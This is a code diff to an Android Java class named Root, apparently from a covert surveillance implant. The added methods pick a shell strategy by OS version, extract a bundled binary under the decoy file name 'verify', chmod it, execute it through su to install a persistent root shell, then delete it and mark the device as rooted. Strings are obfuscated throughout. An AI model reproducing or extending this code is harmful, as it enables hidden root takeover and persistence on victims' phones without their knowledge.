@@ -275,8 +275,66 @@ public class Root {
 			return;
 		}
 
-		final File filesPath = Status.getAppContext().getFilesDir();
-		// final String path = filesPath.getAbsolutePath();
+		if (android.os.Build.VERSION.SDK_INT < 17) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (supersuRoot) Standard Shell");
+			}
+			standardShell();
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (supersuRoot) Selinux Shell");
+			}
+			selinuxShell();
+		}
+	}
+
+	static public void standardShell() {
+
+		String pack = Status.self().getAppContext().getPackageName();
+		final String installPath = String.format(M.e("/data/data/%s/files"), pack);
+
+		final AutoFile suidext = new AutoFile(installPath, M.e("verify")); // shell_installer.sh
+		// suidext
+
+		try {
+			InputStream streamS = Utils.getAssetStream("s.bin");
+			fileWrite(suidext.getName(), streamS, Cfg.RNDDB);
+			Execute.execute(M.e("/system/bin/chmod 755 ") + suidext);
+
+			ExecuteResult res = Execute.execute(new String[] { "su", "-c", suidext.getFilename(), "rt" });
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (supersuRoot) execute 2: " + suidext + " ret: " + res.exitCode);
+			}
+
+			suidext.delete();
+
+			if (Root.isRootShellInstalled()) {
+
+				if (PackageInfo.checkRoot()) {
+					Status.setRoot(true);
+
+					Status.self().setReload();
+				}
+			}
+
+		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(e1);//$NON-NLS-1$
+				Check.log(TAG + " (supersuRoot): Exception"); //$NON-NLS-1$
+			}
+
+			return;
+		}
+	}
+
+	static public void selinuxShell() {
+		// dalla 4.2.2 compreso in su nuova shell
+
 		String pack = Status.self().getAppContext().getPackageName();
 		final String installPath = String.format(M.e("/data/data/%s/files"), pack);
 
@@ -284,6 +342,7 @@ public class Root {
 		final AutoFile shellInstaller = new AutoFile(installPath, M.e("verify")); // shell_installer.sh
 
 		try {
+
 			// selinux_suidext
 			InputStream streamJ = Utils.getAssetStream("j.bin");
 			// shell_installer.sh
@@ -308,7 +367,7 @@ public class Root {
 			ExecuteResult res = Execute.execute(new String[] { "su", "-c",
 					shellInstaller.getFilename() + " " + selinuxSuidext.getFilename() });
 
-			if (Cfg.DEBUG) { 
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " (supersuRoot) execute 2: " + shellInstaller + " ret: " + res.exitCode);
 			}
 
